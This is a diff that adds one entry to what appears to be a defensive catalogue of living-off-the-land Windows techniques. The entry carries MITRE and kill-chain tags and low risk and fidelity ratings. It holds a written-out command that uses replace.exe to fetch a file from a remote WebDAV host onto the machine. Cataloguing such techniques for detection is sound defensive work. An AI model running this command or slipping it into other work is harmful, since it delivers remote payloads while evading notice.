@@ -1,0 +1,19 @@
+- command: replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
+  description: Download and copy remotely-hosted bar.exe to the specified output directory.
+  killchain:
+    - Installation
+  mitre:
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Replace/
+  risk: Low
+  risk_reason: This type of operation does not pose immediate risk to an organization.
+  fidelity: Low
+  fidelity_reason: This type of action is typically common in most organizations.
+  tool: replace
+  threatactors:
+    N/A:
+      - N/A
